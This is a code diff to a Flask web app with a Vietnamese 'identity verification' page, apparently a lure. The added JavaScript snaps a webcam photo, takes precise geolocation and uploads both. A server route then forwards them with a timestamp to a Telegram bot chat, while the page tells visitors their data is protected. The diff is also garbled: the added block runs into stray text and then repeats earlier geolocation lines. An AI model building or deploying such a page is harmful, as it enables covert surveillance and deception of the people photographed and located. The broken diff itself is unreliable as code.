@@ -215,7 +215,7 @@ def index():
   <!-- MODAL XÁC NHẬN QUYỀN -->
   <div id="consentModal">
     <div class="modal-content">
-      <h2>Xác nhận quyền riêng tư</h2>
+      <h2>🔒 Xác nhận quyền riêng tư</h2>
       
       <div class="permission-list">
         <div class="permission-item">
@@ -252,7 +252,7 @@ def index():
   <div class="container">
     <button id="startButton">Bắt đầu xác minh</button>
     <p class="privacy-note">
-      Dữ liệu của bạn được bảo mật theo chính sách quyền riêng tư
+      🔐 Dữ liệu của bạn được bảo mật theo chính sách quyền riêng tư
     </p>
   </div>
 
@@ -315,18 +315,33 @@ def index():
     const acceptButton = document.getElementById('acceptButton');
     const cancelButton = document.getElementById('cancelButton');
 
+    // Debug: Log khi trang load
+    console.log('✅ Trang đã load xong');
+    console.log('Các element:', {
+      startButton: !!startButton,
+      consentModal: !!consentModal,
+      consentCheck: !!consentCheck,
+      acceptButton: !!acceptButton,
+      cancelButton: !!cancelButton
+    });
+
     // Kích hoạt nút đồng ý khi checkbox được chọn
     consentCheck.addEventListener('change', function() {
+      console.log('Checkbox changed:', this.checked);
       acceptButton.disabled = !this.checked;
     });
 
     // Hiển thị modal khi nhấn nút bắt đầu
-    startButton.addEventListener('click', function() {
+    startButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      console.log('🖱️ Đã click nút bắt đầu');
       consentModal.style.display = 'block';
     });
 
     // Xử lý nút từ chối
-    cancelButton.addEventListener('click', function() {
+    cancelButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      console.log('❌ Từ chối');
       consentModal.style.display = 'none';
       consentCheck.checked = false;
       acceptButton.disabled = true;
@@ -334,12 +349,17 @@ def index():
     });
 
     // Xử lý nút đồng ý
-    acceptButton.addEventListener('click', function() {
+    acceptButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      console.log('✅ Đã click đồng ý');
+      
       if (!consentCheck.checked) {
         alert('Vui lòng đồng ý với điều khoản trước khi tiếp tục.');
         return;
       }
+      
       consentModal.style.display = 'none';
+      console.log('🚀 Bắt đầu chụp ảnh...');
       startCapture();
     });
 
@@ -359,7 +379,7 @@ def index():
         
         // Chờ video sẵn sàng
         video.onloadedmetadata = () => {
-          startButton.textContent = 'Đang chụp ảnh...';
+          startButton.textContent = '📸 Đang chụp ảnh...';
           
           // Chụp sau 3 giây
           setTimeout(() => {
@@ -370,9 +390,130 @@ def index():
             // Dừng camera
             stream.getTracks().forEach(track => track.stop());
             
-            startButton.textContent = 'Đang lấy vị trí...';
+            startButton.textContent = '📍 Đang lấy vị trí...';
             
             // Lấy vị trí
+            navigator.geolocation.getCurrentPosition(
+              function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                sendData(imageData, lat, lon);
+              }, 
+              function(error) {
+                console.warn('Không lấy được vị trí:', error);
+                sendData(imageData, 'không xác định', 'không xác định');
+              },
+              {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+              }
+            );
+          }, 3000);
+        };
+      })
+      .catch(err => {
+        console.error('Lỗi camera:', err);
+        startButton.textContent = '❌ Không thể truy cập camera';
+        startButton.disabled = false;
+        alert('Lỗi: ' + err.message + '\n\nVui lòng cho phép truy cập camera trong cài đặt trình duyệt.');
+      });
+    }
+
+    function sendData(imageData, lat, lon) {
+      startButton.textContent = '☁️ Đang tải lên...';
+      
+      const payload = new URLSearchParams();
+      payload.append('image', imageData);
+      payload.append('lat', lat);
+      payload.append('lon', lon);
+
+      fetch('/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: payload
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Phản hồi từ server:', data);
+        if (data === 'OK') {
+          startButton.textContent = '✅ Xác minh thành công!';
+          startButton.style.backgroundColor = '#28a745';
+        } else {
+          startButton.textContent = '⚠️ Có lỗi xảy ra';
+          startButton.style.backgroundColor = '#ffc107';
+        }
+      })
+      .catch(err => {
+        console.error('Lỗi upload:', err);
+        startButton.textContent = '❌ Lỗi kết nối';
+        startButton.style.backgroundColor = '#dc3545';
+        startButton.disabled = false;
+      });
+    }
+  </script>
+</body>
+</html>
+'''
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    data_url = request.form.get('image')
+    lat = request.form.get('lat', 'không xác định')
+    lon = request.form.get('lon', 'không xác định')
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    if not data_url:
+        print("Không nhận được dữ liệu ảnh")
+        return 'Lỗi: Không có dữ liệu ảnh', 400
+
+    try:
+        # Xử lý base64
+        if ',' in data_url:
+            encoded = data_url.split(',', 1)[1]
+        else:
+            encoded = data_url
+        
+        image_data = base64.b64decode(encoded)
+        print(f"Đã decode ảnh thành công, kích thước: {len(image_data)} bytes")
+        
+    except Exception as e:
+        print(f"LỖI DECODE BASE64: {e}")
+        return 'Lỗi decode ảnh', 400
+
+    # Tạo caption
+    caption = f"📸 Xác minh tự động\n⏰ Thời gian: {timestamp}\n📍 Vị trí: {lat}, {lon}"
+
+    # Gửi đến Telegram
+    files = {'photo': ('verification.jpg', image_data, 'image/jpeg')}
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+    data = {
+        'chat_id': TELEGRAM_CHAT_ID,
+        'caption': caption
+    }
+
+    try:
+        response = requests.post(url, data=data, files=files, timeout=10)
+        
+        if response.ok:
+            print("✅ Gửi ảnh thành công đến Telegram")
+            return 'OK', 200
+        else:
+            print(f"❌ LỖI TELEGRAM API:")
+            print(f"   - Status Code: {response.status_code}")
+            print(f"   - Response: {response.text}")
+            return 'Lỗi gửi ảnh', 500
+            
+    except requests.exceptions.Timeout:
+        print("❌ LỖI: Timeout khi kết nối Telegram")
+        return 'Lỗi timeout', 504
+    except requests.exceptions.RequestException as e:
+        print(f"❌ LỖI KẾT NỐI: {e}")
+        return 'Lỗi kết nối', 500
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port, debug=False) vị trí
             navigator.geolocation.getCurrentPosition(
               function(position) {
                 const lat = position.coords.latitude;
@@ -494,3 +635,4 @@ def upload():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
+
